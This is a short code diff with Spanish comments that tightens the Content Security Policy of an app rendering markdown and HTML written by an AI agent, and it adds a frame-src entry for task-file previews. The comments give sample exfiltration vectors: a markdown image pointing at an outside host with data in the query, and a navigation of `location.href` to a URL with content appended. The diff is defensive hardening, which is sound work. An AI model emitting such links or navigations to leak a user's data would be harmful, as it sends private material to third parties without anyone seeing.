@@ -6,7 +6,7 @@
  * markdown que escribió un agente sobre material del cliente. Con la política en
  * `null` —como estuvo—, un `![](http://ajeno/?d=…)` dispara el GET al pintarse,
  * sin un clic y sin una línea en `publications.jsonl`. Nada falla, nada se ve, y
- * `ARCHITECTURE.md` § 7 promete que todo lo que sale queda anotado. El ataque y su
+ * La app promete que todo lo que sale queda anotado. El ataque y su
  * control negativo: `tests/security/window.mjs`.
  *
  * Y una política se afloja sola con el tiempo: alguien mete un `img-src *` para
@@ -69,7 +69,9 @@ const PERMITIDO = {
   "connect-src": ["'self'", "ipc:", "http://ipc.localhost", "https://computers.danil.ai", "wss://computers.danil.ai"],
   // El tercer candado del contenedor: a dónde puede navegar un marco hijo. Sin
   // esto el HTML del agente hace `location.href = "http://…/?" + contenido`.
-  "frame-src": ["'self'"],
+  // `terminus-page` es la vista previa de un `.html` de la tarea (`page_preview.rs`):
+  // sirve solo archivos de su carpeta: navegar ahí no saca nada.
+  "frame-src": ["'self'", "terminus-page:", "http://terminus-page.localhost"],
   "object-src": ["'none'"],
   // Las dos que NO heredan de `default-src`: sin escribirlas quedan abiertas.
   "base-uri": ["'none'"],
